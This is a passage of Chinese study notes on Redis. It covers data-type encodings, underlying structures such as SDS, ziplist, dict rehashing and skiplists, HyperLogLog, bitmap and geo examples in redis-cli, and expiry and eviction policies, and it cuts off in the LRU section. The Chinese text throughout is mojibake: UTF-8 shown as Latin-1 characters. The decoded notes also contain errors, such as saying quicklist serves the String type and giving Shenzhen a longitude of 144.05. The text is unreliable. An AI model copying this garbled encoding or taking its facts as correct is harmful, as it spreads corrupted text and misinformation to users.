æ¶ˆæ¯é˜Ÿåˆ—\n\n### 1.3 hash\n\n- ziplistï¼škeyå’Œvalueçš„å­—ç¬¦ä¸²é•¿åº¦éƒ½å°äº64å­—èŠ‚`&&`é”®å€¼å¯¹æ€»æ•°é‡å°äº512\n- hashtableï¼škeyå’Œvalueçš„å­—ç¬¦ä¸²é•¿åº¦å¤§äº64å­—èŠ‚`||`é”®å€¼å¯¹æ€»æ•°é‡å¤§äº512\n\n**ä½¿ç”¨åœºæ™¯**\n\n- ç¼“å­˜ï¼š ç›´è§‚ï¼Œç›¸æ¯”stringæ›´èŠ‚çœç©ºé—´ï¼Œçš„ç»´æŠ¤ç¼“å­˜ä¿¡æ¯ï¼Œå¦‚ç”¨æˆ·ä¿¡æ¯ï¼Œè§†é¢‘ä¿¡æ¯ç­‰ã€‚\n\n### 1.4 set\n\n- intsetï¼šä¿å­˜çš„å…ƒç´ å…¨éƒ½æ˜¯æ•´æ•°`&&`æ€»æ•°é‡å°äº512\n- hashtableï¼šä¿å­˜çš„å…ƒç´ ä¸æ˜¯æ•´æ•°`||`æ€»æ•°é‡å¤§äº512\n\n**ä½¿ç”¨åœºæ™¯**\n\n- æ ‡ç­¾ï¼ˆtagï¼‰ï¼Œç»™ç”¨æˆ·æ·»åŠ æ ‡ç­¾ï¼Œæˆ–è€…ç”¨æˆ·ç»™æ¶ˆæ¯æ·»åŠ æ ‡ç­¾ï¼Œè¿™æ ·æœ‰åŒä¸€æ ‡ç­¾æˆ–è€…ç±»ä¼¼æ ‡ç­¾çš„å¯ä»¥ç»™æ¨èå…³æ³¨çš„äº‹æˆ–è€…å…³æ³¨çš„äººã€‚\n- ç‚¹èµï¼Œæˆ–ç‚¹è¸©ï¼Œæ”¶è—ç­‰ï¼Œå¯ä»¥æ”¾åˆ°setä¸­å®ç°\n\n### 1.5 zset\n\n- ziplistï¼šå…ƒç´ é•¿åº¦å°äº64`&&`æ€»æ•°é‡å°äº128\n- skiplistï¼šå…ƒç´ é•¿åº¦å¤§äº64`||`æ€»æ•°é‡å¤§äº128\n\nskiplistèƒ½å¤Ÿè¾¾åˆ°æ’å…¥çš„æ—¶é—´å¤æ‚åº¦ä¸ºO(logn)ï¼Œæ ¹æ®æˆå‘˜æŸ¥åˆ†å€¼çš„æ—¶é—´å¤æ‚åº¦ä¸ºO(1)\n\n**ä½¿ç”¨åœºæ™¯**\n\n+ æ’è¡Œæ¦œï¼šæœ‰åºé›†åˆç»å…¸ä½¿ç”¨åœºæ™¯ã€‚ä¾‹å¦‚å°è¯´è§†é¢‘ç­‰ç½‘ç«™éœ€è¦å¯¹ç”¨æˆ·ä¸Šä¼ çš„å°è¯´è§†é¢‘åšæ’è¡Œæ¦œï¼Œæ¦œå•å¯ä»¥æŒ‰ç…§ç”¨æˆ·å…³æ³¨æ•°ï¼Œæ›´æ–°æ—¶é—´ï¼Œå­—æ•°ç­‰æ‰“åˆ†ï¼Œåšæ’è¡Œã€‚\n\n# 2.åº•å±‚æ•°æ®ç»“æ„\n\n<img src=\"redisæ•°æ®ç»“æ„å’ŒæŒä¹…åŒ–/image-20230831144857220.png\" alt=\"image-20230831144857220\" style=\"zoom:50%;\" />\n\n### 2.1 ç®€å•åŠ¨æ€å­—ç¬¦ä¸² - SDS\n\n- å¸¸æ•°å¤æ‚åº¦è·å–å­—ç¬¦ä¸²é•¿åº¦\n\n  ç”±äº len å±æ€§çš„å­˜åœ¨ï¼Œæˆ‘ä»¬è·å– SDS å­—ç¬¦ä¸²çš„é•¿åº¦åªéœ€è¦è¯»å– len å±æ€§ï¼Œæ—¶é—´å¤æ‚åº¦ä¸º O(1)ã€‚\n\n- æœç»ç¼“å†²åŒºæº¢å‡º\n\n- å‡å°‘ä¿®æ”¹å­—ç¬¦ä¸²çš„å†…å­˜é‡æ–°åˆ†é…æ¬¡æ•°\n\n  ç”±äºlenå±æ€§å’Œallocå±æ€§çš„å­˜åœ¨ï¼Œå¯¹äºä¿®æ”¹å­—ç¬¦ä¸²SDSå®ç°äº†ç©ºé—´é¢„åˆ†é…å’Œæƒ°æ€§ç©ºé—´é‡Šæ”¾ä¸¤ç§ç­–ç•¥ã€‚\n\n+ äºŒè¿›åˆ¶å®‰å…¨\n+ å…¼å®¹éƒ¨åˆ† C å­—ç¬¦ä¸²å‡½æ•°\n\n### 2.2 å‹ç¼©åˆ—è¡¨ - ZipList\n\nZiplist æ˜¯å†…å­˜ç´§å‡‘å‹åˆ—è¡¨ï¼ŒèŠ‚çœå†…å­˜ç©ºé—´ã€æå‡å†…å­˜ä½¿ç”¨ç‡ã€‚é€‚ç”¨åˆ—è¡¨æ•°é‡è¾ƒå°‘ï¼Œå…ƒç´ sizeè¾ƒå°çš„åœºæ™¯ã€‚\n\n1. è¿ç»­å­˜å‚¨ï¼šZiplistä¸­çš„å…ƒç´ æ˜¯è¿ç»­å­˜å‚¨çš„ï¼Œä¸åƒæ™®é€šçš„åŒå‘é“¾è¡¨é‚£æ ·ä½¿ç”¨æŒ‡é’ˆè¿›è¡Œè¿æ¥ã€‚è¿™æ ·å¯ä»¥å‡å°‘æŒ‡é’ˆçš„ä½¿ç”¨ï¼Œä»è€ŒèŠ‚çœå†…å­˜ã€‚\n\n2. ç´§å‡‘å­˜å‚¨ï¼šZiplisté€šè¿‡ä½¿ç”¨ç´§å‡‘çš„å­˜å‚¨æ ¼å¼ï¼Œå¯ä»¥èŠ‚çœå†…å­˜ç©ºé—´ã€‚å®ƒå°†ä¸åŒé•¿åº¦çš„å­—ç¬¦ä¸²å’Œæ•´æ•°å­˜å‚¨åœ¨ä¸€èµ·ï¼Œä½¿ç”¨ç‰¹å®šçš„ç¼–ç æ–¹å¼è¿›è¡Œå‹ç¼©ï¼Œä»è€Œå‡å°‘äº†å­˜å‚¨ç©ºé—´çš„å ç”¨ã€‚\n\n3. å¿«é€Ÿè®¿é—®ï¼šç”±äºZiplistä½¿ç”¨è¿ç»­å­˜å‚¨ï¼Œå¯ä»¥é€šè¿‡åç§»é‡ï¼ˆoffsetï¼‰å¿«é€Ÿè®¿é—®åˆ°æŒ‡å®šä½ç½®çš„å…ƒç´ ï¼Œè€Œæ— éœ€åƒæ™®é€šé“¾è¡¨é‚£æ ·éå†ã€‚\n\n   \n\n### 2.3 å¿«è¡¨ - QuickList\n\nquicklistè¿™ä¸ªç»“æ„æ˜¯Redisåœ¨3.2ç‰ˆæœ¬åæ–°åŠ çš„, ä¹‹å‰çš„ç‰ˆæœ¬æ˜¯list(å³linkedlist)ï¼Œ ç”¨äºStringæ•°æ®ç±»å‹ä¸­ã€‚\n\nå®ƒæ˜¯ä¸€ç§ä»¥ziplistä¸ºç»“ç‚¹çš„åŒç«¯é“¾è¡¨ç»“æ„. å®è§‚ä¸Š, quicklistæ˜¯ä¸€ä¸ªé“¾è¡¨, å¾®è§‚ä¸Š, é“¾è¡¨ä¸­çš„æ¯ä¸ªç»“ç‚¹éƒ½æ˜¯ä¸€ä¸ªziplistã€‚\n\n### 2.4 å­—å…¸/å“ˆå¸Œè¡¨ - Dict\n\n**1. è§£å†³å“ˆå¸Œå†²çª**\n\n  é“¾åœ°å€æ³•ã€‚é€šè¿‡å­—å…¸é‡Œé¢çš„ *next æŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€ä¸ªå…·æœ‰ç›¸åŒç´¢å¼•å€¼çš„å“ˆå¸Œè¡¨èŠ‚ç‚¹ã€‚\n\n**2. æ‰©å®¹å’Œæ”¶ç¼©**\n\n  å½“å“ˆå¸Œè¡¨ä¿å­˜çš„é”®å€¼å¯¹å¤ªå¤šæˆ–è€…å¤ªå°‘æ—¶ï¼Œå°±è¦é€šè¿‡ rerehash(é‡æ–°æ•£åˆ—ï¼‰æ¥å¯¹å“ˆå¸Œè¡¨è¿›è¡Œç›¸åº”çš„æ‰©å±•æˆ–è€…æ”¶ç¼©ã€‚å…·ä½“æ­¥éª¤ï¼š\n\n1ã€å¦‚æœæ‰§è¡Œæ‰©å±•æ“ä½œï¼Œä¼šåŸºäºåŸå“ˆå¸Œè¡¨åˆ›å»ºä¸€ä¸ªå¤§å°ç­‰äº ht[0].used*2n çš„å“ˆå¸Œè¡¨ï¼ˆä¹Ÿå°±æ˜¯æ¯æ¬¡æ‰©å±•éƒ½æ˜¯æ ¹æ®åŸå“ˆå¸Œè¡¨å·²ä½¿ç”¨çš„ç©ºé—´æ‰©å¤§ä¸€å€åˆ›å»ºå¦ä¸€ä¸ªå“ˆå¸Œè¡¨ï¼‰ã€‚ç›¸åå¦‚æœæ‰§è¡Œçš„æ˜¯æ”¶ç¼©æ“ä½œï¼Œæ¯æ¬¡æ”¶ç¼©æ˜¯æ ¹æ®å·²ä½¿ç”¨ç©ºé—´ç¼©å°ä¸€å€åˆ›å»ºä¸€ä¸ªæ–°çš„å“ˆå¸Œè¡¨ã€‚\n\n2ã€é‡æ–°åˆ©ç”¨ä¸Šé¢çš„å“ˆå¸Œç®—æ³•ï¼Œè®¡ç®—ç´¢å¼•å€¼ï¼Œç„¶åå°†é”®å€¼å¯¹æ”¾åˆ°æ–°çš„å“ˆå¸Œè¡¨ä½ç½®ä¸Šã€‚\n\n3ã€æ‰€æœ‰é”®å€¼å¯¹éƒ½è¿å¾™å®Œæ¯•åï¼Œé‡Šæ”¾åŸå“ˆå¸Œè¡¨çš„å†…å­˜ç©ºé—´ã€‚\n\n**3. è§¦å‘æ‰©å®¹çš„æ¡ä»¶**\n\n1ã€æœåŠ¡å™¨ç›®å‰æ²¡æœ‰æ‰§è¡Œ BGSAVE å‘½ä»¤æˆ–è€… BGREWRITEAOF å‘½ä»¤ï¼Œå¹¶ä¸”è´Ÿè½½å› å­å¤§äºç­‰äº1ã€‚\n\n2ã€æœåŠ¡å™¨ç›®å‰æ­£åœ¨æ‰§è¡Œ BGSAVE å‘½ä»¤æˆ–è€… BGREWRITEAOF å‘½ä»¤ï¼Œå¹¶ä¸”è´Ÿè½½å› å­å¤§äºç­‰äº5ã€‚\n\npsï¼šè´Ÿè½½å› å­ = å“ˆå¸Œè¡¨å·²ä¿å­˜èŠ‚ç‚¹æ•°é‡ / å“ˆå¸Œè¡¨å¤§å°ã€‚\n\n**4. æ¸è¿‘å¼ rehash**\n\nä»€ä¹ˆå«æ¸è¿›å¼ rehashï¼Ÿä¹Ÿå°±æ˜¯è¯´æ‰©å®¹å’Œæ”¶ç¼©æ“ä½œä¸æ˜¯ä¸€æ¬¡æ€§ã€é›†ä¸­å¼å®Œæˆçš„ï¼Œè€Œæ˜¯åˆ†å¤šæ¬¡ã€æ¸è¿›å¼å®Œæˆçš„ã€‚å¦‚æœä¿å­˜åœ¨Redisä¸­çš„é”®å€¼å¯¹åªæœ‰å‡ ä¸ªå‡ åä¸ªï¼Œé‚£ä¹ˆ rehash æ“ä½œå¯ä»¥ç¬é—´å®Œæˆï¼Œä½†æ˜¯å¦‚æœé”®å€¼å¯¹æœ‰å‡ ç™¾ä¸‡ï¼Œå‡ åƒä¸‡ç”šè‡³å‡ äº¿ï¼Œé‚£ä¹ˆè¦ä¸€æ¬¡æ€§çš„è¿›è¡Œ rehashï¼ŒåŠ¿å¿…ä¼šé€ æˆRedisä¸€æ®µæ—¶é—´å†…ä¸èƒ½è¿›è¡Œåˆ«çš„æ“ä½œã€‚\n\næ‰€ä»¥Redisé‡‡ç”¨æ¸è¿›å¼ rehashï¼Œè¿™æ ·åœ¨è¿›è¡Œæ¸è¿›å¼rehashæœŸé—´ï¼Œå­—å…¸çš„åˆ é™¤æŸ¥æ‰¾æ›´æ–°ç­‰æ“ä½œå¯èƒ½ä¼šåœ¨ä¸¤ä¸ªå“ˆå¸Œè¡¨ä¸Šè¿›è¡Œï¼Œç¬¬ä¸€ä¸ªå“ˆå¸Œè¡¨æ²¡æœ‰æ‰¾åˆ°ï¼Œå°±ä¼šå»ç¬¬äºŒä¸ªå“ˆå¸Œè¡¨ä¸Šè¿›è¡ŒæŸ¥æ‰¾ã€‚ä½†æ˜¯è¿›è¡Œå¢åŠ æ“ä½œï¼Œä¸€å®šæ˜¯åœ¨æ–°çš„å“ˆå¸Œè¡¨ä¸Šè¿›è¡Œçš„ã€‚\n\n### 2.5 æ•´æ•°é›† - IntSet\n\næ•´æ•°é›†åˆï¼ˆintsetï¼‰æ˜¯é›†åˆç±»å‹çš„åº•å±‚å®ç°ä¹‹ä¸€ï¼Œå½“ä¸€ä¸ªé›†åˆåªåŒ…å«æ•´æ•°å€¼å…ƒç´ ï¼Œå¹¶ä¸”è¿™ä¸ªé›†åˆçš„å…ƒç´ æ•°é‡ä¸å¤šæ—¶ï¼ŒRedis å°±ä¼šä½¿ç”¨æ•´æ•°é›†åˆä½œä¸ºé›†åˆé”®çš„åº•å±‚å®ç°ã€‚\n\n### 2.6 è·³è¡¨ - ZSkipList\n\n1. è·³è·ƒè¡¨æ˜¯ä¸€ç§å¹³è¡¡çš„æ•°æ®ç»“æ„ï¼šä¸å¹³è¡¡äºŒå‰æœç´¢æ ‘ç›¸æ¯”ï¼Œè·³è·ƒè¡¨çš„æ’å…¥ã€åˆ é™¤å’ŒæŸ¥æ‰¾æ“ä½œçš„å¹³å‡æ—¶é—´å¤æ‚åº¦éƒ½æ˜¯O(log n)ï¼Œå…¶ä¸­næ˜¯å…ƒç´ çš„æ•°é‡ã€‚\n1. è·³è·ƒè¡¨æ˜¯ä¸€ç§æœ‰åºæ•°æ®ç»“æ„ï¼šè·³è·ƒè¡¨ä¸­çš„å…ƒç´ æ˜¯æœ‰åºæ’åˆ—çš„ï¼Œä½¿å¾—æŸ¥æ‰¾æ“ä½œå¯ä»¥é€šè¿‡è·³è·ƒçš„æ–¹å¼å¿«é€Ÿå®šä½åˆ°ç›®æ ‡å…ƒç´ ã€‚\n1. è·³è·ƒè¡¨é€šè¿‡å¤šçº§ç´¢å¼•å®ç°å¿«é€ŸæŸ¥æ‰¾ï¼šè·³è·ƒè¡¨ä¸­çš„æ¯ä¸€å±‚éƒ½æ˜¯åŸå§‹é“¾è¡¨çš„ä¸€ä¸ªå­é›†ï¼Œæ¯ä¸€çº§ç´¢å¼•çš„å…ƒç´ æ•°é‡é€æ¸å‡å°‘ã€‚é€šè¿‡åœ¨ä¸åŒçº§åˆ«ä¹‹é—´è·³è·ƒï¼Œå¯ä»¥å¿«é€Ÿå®šä½åˆ°ç›®æ ‡å…ƒç´ ã€‚\n1. è·³è·ƒè¡¨æ”¯æŒé«˜æ•ˆçš„æ’å…¥å’Œåˆ é™¤æ“ä½œï¼šç›¸æ¯”å¹³è¡¡äºŒå‰æœç´¢æ ‘ï¼Œè·³è·ƒè¡¨çš„æ’å…¥å’Œåˆ é™¤æ“ä½œæ›´åŠ ç®€å•é«˜æ•ˆï¼Œä¸éœ€è¦è¿›è¡Œå¹³è¡¡æ“ä½œï¼Œåªéœ€è¦æ›´æ–°ç´¢å¼•å±‚çš„æŒ‡é’ˆå³å¯ã€‚\n1. è·³è·ƒè¡¨ç›¸å¯¹ç®€å•æ˜“å®ç°ï¼šç›¸æ¯”å…¶ä»–å¹³è¡¡æ•°æ®ç»“æ„å¦‚çº¢é»‘æ ‘ç­‰ï¼Œè·³è·ƒè¡¨çš„å®ç°ç›¸å¯¹ç®€å•ï¼Œå®¹æ˜“ç†è§£å’Œå®ç°ã€‚\n1. è·³è·ƒè¡¨ç›¸å¯¹äºå…¶ä»–æ•°æ®ç»“æ„ï¼Œå¯èƒ½ä¼šå ç”¨æ›´å¤šçš„å†…å­˜ç©ºé—´æ¥å­˜å‚¨é¢å¤–çš„ç´¢å¼•å±‚ã€‚\n\n<img src=\"redisæ•°æ®ç»“æ„å’ŒæŒä¹…åŒ–/image-20230831151230763.png\" alt=\"image-20230831151230763\" style=\"zoom:43%;\" />\n\n**ä¸ºä»€ä¹ˆRedisé€‰æ‹©ä½¿ç”¨è·³è¡¨è€Œä¸æ˜¯çº¢é»‘æ ‘æ¥å®ç°æœ‰åºé›†åˆ?**\n\nRedis ä¸­çš„æœ‰åºé›†åˆ(zset) æ”¯æŒçš„æ“ä½œï¼šæ’å…¥ä¸€ä¸ªå…ƒç´ ï¼Œåˆ é™¤ä¸€ä¸ªå…ƒç´ ï¼ŒæŸ¥æ‰¾ä¸€ä¸ªå…ƒç´ ï¼Œæœ‰åºè¾“å‡ºæ‰€æœ‰å…ƒç´ ï¼ŒæŒ‰ç…§èŒƒå›´åŒºé—´æŸ¥æ‰¾å…ƒç´ ï¼ˆæ¯”å¦‚æŸ¥æ‰¾å€¼åœ¨ [100, 356] ä¹‹é—´çš„æ•°æ®ï¼‰ã€‚\n\nå…¶ä¸­ï¼Œå‰å››ä¸ªæ“ä½œçº¢é»‘æ ‘ä¹Ÿå¯ä»¥å®Œæˆï¼Œä¸”æ—¶é—´å¤æ‚åº¦è·Ÿè·³è¡¨æ˜¯ä¸€æ ·çš„ã€‚ä½†æ˜¯ï¼ŒæŒ‰ç…§åŒºé—´æ¥æŸ¥æ‰¾æ•°æ®è¿™ä¸ªæ“ä½œï¼Œçº¢é»‘æ ‘çš„æ•ˆç‡æ²¡æœ‰è·³è¡¨é«˜ã€‚æŒ‰ç…§åŒºé—´æŸ¥æ‰¾æ•°æ®æ—¶ï¼Œè·³è¡¨å¯ä»¥åšåˆ° O(logn) çš„æ—¶é—´å¤æ‚åº¦å®šä½åŒºé—´çš„èµ·ç‚¹ï¼Œç„¶ååœ¨åŸå§‹é“¾è¡¨ä¸­é¡ºåºå¾€åéå†å°±å¯ä»¥äº†ï¼Œéå¸¸é«˜æ•ˆã€‚\n\n\n\n# 3. å…¶ä»–æ•°æ®å¯¹è±¡\n\n### 3.1 HyperLogLogsï¼ˆåŸºæ•°ç»Ÿè®¡)\n\næ¯”å¦‚æ•°æ®é›† {1, 3, 5, 7, 5, 7, 8}ï¼Œ é‚£ä¹ˆè¿™ä¸ªæ•°æ®é›†çš„åŸºæ•°é›†ä¸º {1, 3, 5 ,7, 8}, åŸºæ•°(ä¸é‡å¤å…ƒç´ )ä¸º5ã€‚ åŸºæ•°ä¼°è®¡å°±æ˜¯åœ¨è¯¯å·®å¯æ¥å—çš„èŒƒå›´å†…ï¼Œå¿«é€Ÿè®¡ç®—åŸºæ•°ã€‚\n\n```bash\n127.0.0.1:6379> pfadd key1 a b c d e f g h i\t# åˆ›å»ºç¬¬ä¸€ç»„å…ƒç´ \n(integer) 1\n127.0.0.1:6379> pfcount key1\t\t\t\t\t# ç»Ÿè®¡å…ƒç´ çš„åŸºæ•°æ•°é‡\n(integer) 9\n127.0.0.1:6379> pfadd key2 c j k l m e g a\t\t# åˆ›å»ºç¬¬äºŒç»„å…ƒç´ \n(integer) 1\n127.0.0.1:6379> pfcount key2\n(integer) 8\n127.0.0.1:6379> pfmerge key3 key1 key2\t\t\t# åˆå¹¶ä¸¤ç»„ï¼škey1 key2 -> key3 å¹¶é›†\nOK\n127.0.0.1:6379> pfcount key3\n(integer) 13\n```\n\nHyperLogLogåªèƒ½ç»Ÿè®¡åŸºæ•°çš„å¤§å°ï¼ˆä¹Ÿå°±æ˜¯æ•°æ®é›†çš„å¤§å°ï¼Œé›†åˆçš„ä¸ªæ•°ï¼‰ï¼Œä»–ä¸èƒ½å­˜å‚¨å…ƒç´ çš„æœ¬èº«ï¼Œä¸èƒ½å‘seté›†åˆé‚£æ ·å­˜å‚¨å…ƒç´ æœ¬èº«ï¼Œä¹Ÿå°±æ˜¯è¯´æ— æ³•è¿”å›å…ƒç´ ã€‚\n\n### 3.2 Bitmap ï¼ˆä½å­˜å‚¨ï¼‰\n\nBitmap å³ä½å›¾æ•°æ®ç»“æ„ï¼Œéƒ½æ˜¯æ“ä½œäºŒè¿›åˆ¶ä½æ¥è¿›è¡Œè®°å½•ï¼Œåªæœ‰0 å’Œ 1 ä¸¤ä¸ªçŠ¶æ€ã€‚\n\n**ä¸¤ä¸ªçŠ¶æ€çš„ï¼Œéƒ½å¯ä»¥ä½¿ç”¨ Bitmaps**ï¼å¦‚æœå­˜å‚¨ä¸€å¹´çš„æ‰“å¡çŠ¶æ€éœ€è¦å¤šå°‘å†…å­˜å‘¢ï¼Ÿ 365 å¤© = 365 bit 1å­—èŠ‚ = 8bit 46 ä¸ªå­—èŠ‚å·¦å³ï¼\n\n```bash\n127.0.0.1:6379> setbit sign 0 1\n(integer) 0\n127.0.0.1:6379> setbit sign 1 1\n(integer) 0\n127.0.0.1:6379> setbit sign 2 0\n(integer) 0\n127.0.0.1:6379> setbit sign 3 1\n(integer) 0\n127.0.0.1:6379> setbit sign 4 0\n(integer) 0\n127.0.0.1:6379> setbit sign 5 0\n(integer) 0\n127.0.0.1:6379> setbit sign 6 1\n(integer) 0\n\n\n127.0.0.1:6379> bitcount sign # ç»Ÿè®¡è¿™å‘¨çš„æ‰“å¡è®°å½•ï¼Œå°±å¯ä»¥çœ‹åˆ°æ˜¯å¦æœ‰å…¨å‹¤ï¼\n(integer) 4\n```\n\n\n\n### 3.3 geospatial (åœ°ç†ä½ç½®)\n\ngeoåº•å±‚çš„å®ç°åŸç†å®é™…ä¸Šå°±æ˜¯Zsetã€‚\n\nRedis çš„ Geo åœ¨ Redis 3.2 ç‰ˆæœ¬å°±æ¨å‡ºäº†! è¿™ä¸ªåŠŸèƒ½å¯ä»¥æ¨ç®—åœ°ç†ä½ç½®çš„ä¿¡æ¯: ä¸¤åœ°ä¹‹é—´çš„è·ç¦», æ–¹åœ†å‡ é‡Œçš„äººã€‚\n\n```bash\n# æ·»åŠ åœ°ç†ä½ç½®\n127.0.0.1:6379> geoadd china:city 118.76 32.04 manjing 112.55 37.86 taiyuan 123.43 41.80 shenyang\n(integer) 3\n127.0.0.1:6379> geoadd china:city 144.05 22.52 shengzhen 120.16 30.24 hangzhou 108.96 34.26 xian\n(integer) 3\n\n\n# è·å–æŒ‡å®šçš„æˆå‘˜çš„ç»åº¦å’Œçº¬åº¦\n127.0.0.1:6379> geopos china:city taiyuan manjing\n1) 1) \"112.54999905824661255\"\n   1) \"37.86000073876942196\"\n2) 1) \"118.75999957323074341\"\n   1) \"32.03999960287850968\"\n\n# è·å¾—æ‰€æœ‰é™„è¿‘çš„äººçš„åœ°å€, å®šä½, é€šè¿‡åŠå¾„æ¥æŸ¥è¯¢ï¼Œ ä»¥ 100,30 è¿™ä¸ªåæ ‡ä¸ºä¸­å¿ƒ, å¯»æ‰¾åŠå¾„ä¸º1000kmçš„åŸå¸‚\n127.0.0.1:6379> georadius china:city 110 30 1000 km\t\t\t\n1) \"xian\"\n2) \"hangzhou\"\n3) \"manjing\"\n4) \"taiyuan\"\n\n127.0.0.1:6379> georadius china:city 110 30 500 km\n1) \"xian\"\n127.0.0.1:6379> georadius china:city 110 30 500 km withdist\n1) 1) \"xian\"\n   2) \"483.8340\"\n127.0.0.1:6379> georadius china:city 110 30 1000 km withcoord withdist count 2\n1) 1) \"xian\"\n   2) \"483.8340\"\n   3) 1) \"108.96000176668167114\"\n      2) \"34.25999964418929977\"\n2) 1) \"manjing\"\n   2) \"864.9816\"\n   3) 1) \"118.75999957323074341\"\n      2) \"32.03999960287850968\"\n\n```\n\n### 3.4 Stream\n\nRedis5.0 ä¸­è¿˜å¢åŠ äº†ä¸€ä¸ªæ•°æ®ç»“æ„Streamï¼Œä»å­—é¢ä¸Šçœ‹æ˜¯æµç±»å‹ï¼Œä½†å…¶å®ä»åŠŸèƒ½ä¸Šçœ‹ï¼Œåº”è¯¥æ˜¯Rediså¯¹æ¶ˆæ¯é˜Ÿåˆ—ï¼ˆMQï¼ŒMessage Queueï¼‰çš„å®Œå–„å®ç°ã€‚\n\nç”¨è¿‡Redisåšæ¶ˆæ¯é˜Ÿåˆ—çš„éƒ½äº†è§£ï¼ŒåŸºäºReidsçš„æ¶ˆæ¯é˜Ÿåˆ—å®ç°æœ‰å¾ˆå¤šç§ï¼Œä¾‹å¦‚ï¼š\n\n- PUB/SUBï¼Œè®¢é˜…/å‘å¸ƒæ¨¡å¼ : ä½†æ˜¯å‘å¸ƒè®¢é˜…æ¨¡å¼æ˜¯æ— æ³•æŒä¹…åŒ–çš„ï¼Œå¦‚æœå‡ºç°ç½‘ç»œæ–­å¼€ã€Redis å®•æœºç­‰ï¼Œæ¶ˆæ¯å°±ä¼šè¢«ä¸¢å¼ƒï¼›\n- åŸºäºList LPUSH+BRPOP æˆ–è€… åŸºäºSorted-Setçš„å®ç° ï¼Œæ”¯æŒäº†æŒä¹…åŒ–ï¼Œä½†æ˜¯ä¸æ”¯æŒå¤šæ’­ï¼Œåˆ†ç»„æ¶ˆè´¹ç­‰ã€‚\n\n\n\n# 4. è¿‡æœŸåˆ é™¤ç­–ç•¥å’Œå†…å­˜æ·˜æ±°æœºåˆ¶\n\n### 4.1 è¿‡æœŸåˆ é™¤ç­–ç•¥(3ç§)\n\n- å®šæ—¶åˆ é™¤(å¯¹å†…å­˜å‹å¥½ï¼Œå¯¹CPUä¸å‹å¥½)\n\n  åˆ°æ—¶é—´ç‚¹ä¸Šå°±æŠŠæ‰€æœ‰è¿‡æœŸçš„é”®åˆ é™¤äº†ã€‚\n\n- æƒ°æ€§åˆ é™¤(å¯¹CPUæåº¦å‹å¥½ï¼Œå¯¹å†…å­˜æåº¦ä¸å‹å¥½)\n\n  æ¯æ¬¡ä»é”®ç©ºé—´å–é”®çš„æ—¶å€™ï¼Œåˆ¤æ–­ä¸€ä¸‹è¯¥é”®æ˜¯å¦è¿‡æœŸäº†ï¼Œå¦‚æœè¿‡æœŸäº†å°±åˆ é™¤ã€‚\n\n- å®šæœŸåˆ é™¤(æŠ˜ä¸­)\n\n  æ¯éš”ä¸€æ®µæ—¶é—´å»åˆ é™¤è¿‡æœŸé”®ï¼Œé™åˆ¶åˆ é™¤çš„æ‰§è¡Œæ—¶é•¿å’Œé¢‘ç‡ã€‚\n\nç¬¬ä¸€ç§å’Œç¬¬ä¸‰ç§ä¸ºä¸»åŠ¨åˆ é™¤ç­–ç•¥ï¼Œè€Œç¬¬äºŒç§åˆ™ä¸ºè¢«åŠ¨åˆ é™¤ç­–ç•¥ã€‚Redisé‡‡ç”¨çš„æ˜¯**æƒ°æ€§åˆ é™¤+å®šæœŸåˆ é™¤**ä¸¤ç§ç­–ç•¥ï¼Œæ‰€ä»¥è¯´ï¼Œåœ¨Redisé‡Œè¾¹å¦‚æœè¿‡æœŸé”®åˆ°äº†è¿‡æœŸçš„æ—¶é—´äº†ï¼Œæœªå¿…è¢«ç«‹é©¬åˆ é™¤çš„ï¼\n\n### 4.2 å†…å­˜æ·˜æ±°æœºåˆ¶(8ç§)\n\nå½“ Redis è¿è¡Œå†…å­˜å·²ç»è¶…è¿‡ Redis è®¾ç½®çš„æœ€å¤§å†…å­˜ä¹‹åï¼Œå°†é‡‡ç”¨ä»€ä¹ˆç­–ç•¥æ¥åˆ é™¤ç¬¦åˆæ¡ä»¶çš„é”®å€¼å¯¹ï¼Œä»¥æ­¤æ¥ä¿éšœ Redis é«˜æ•ˆçš„è¿è¡Œã€‚\n\næ—©æœŸç‰ˆæœ¬çš„ Redis æœ‰ä»¥ä¸‹ 6 ç§æ·˜æ±°ç­–ç•¥ï¼š\n\n1. **noeviction**ï¼šä¸æ·˜æ±°ä»»ä½•æ•°æ®ï¼Œå½“å†…å­˜ä¸è¶³æ—¶ï¼Œæ–°å¢æ“ä½œä¼šæŠ¥é”™ï¼ŒRedis é»˜è®¤å†…å­˜æ·˜æ±°ç­–ç•¥ï¼›\n2. **allkeys-lru**ï¼šæ·˜æ±°æ•´ä¸ªé”®å€¼ä¸­æœ€ä¹…æœªä½¿ç”¨çš„é”®å€¼ï¼›\n3. **allkeys-random**ï¼šéšæœºæ·˜æ±°ä»»æ„é”®å€¼;\n4. **volatile-lru**ï¼šæ·˜æ±°æ‰€æœ‰è®¾ç½®äº†è¿‡æœŸæ—¶é—´çš„é”®å€¼ä¸­æœ€ä¹…æœªä½¿ç”¨çš„é”®å€¼ï¼›\n5. **volatile-random**ï¼šéšæœºæ·˜æ±°è®¾ç½®äº†è¿‡æœŸæ—¶é—´çš„ä»»æ„é”®å€¼ï¼›\n6. **volatile-ttl**ï¼šä¼˜å…ˆæ·˜æ±°æ›´æ—©è¿‡æœŸçš„é”®å€¼ã€‚\n\nåœ¨ Redis 4.0 ç‰ˆæœ¬ä¸­åˆæ–°å¢äº† 2 ç§æ·˜æ±°ç­–ç•¥ï¼š\n\n1. **volatile-lfu**ï¼šæ·˜æ±°æ‰€æœ‰è®¾ç½®äº†è¿‡æœŸæ—¶é—´çš„é”®å€¼ä¸­ï¼Œæœ€å°‘ä½¿ç”¨çš„é”®å€¼ï¼›\n2. **allkeys-lfu**ï¼šæ·˜æ±°æ•´ä¸ªé”®å€¼ä¸­æœ€å°‘ä½¿ç”¨çš„é”®å€¼ã€‚\n\nå…¶ä¸­ allkeys-xxx è¡¨ç¤ºä»æ‰€æœ‰çš„é”®å€¼ä¸­æ·˜æ±°æ•°æ®ï¼Œè€Œ volatile-xxx è¡¨ç¤ºä»è®¾ç½®äº†è¿‡æœŸé”®çš„é”®å€¼ä¸­æ·˜æ±°æ•°æ®ã€‚\n\nRedis3.0ä¹‹åï¼Œé»˜è®¤çš„å†…å­˜æ·˜æ±°ç­–ç•¥æ˜¯noevictionã€‚\n\n### 4.3 å†…å­˜æ·˜æ±°ç®—æ³•\n\n##### LRU ç®—æ³•\n\nLRU å…¨ç§°æ˜¯ Least Recently Used 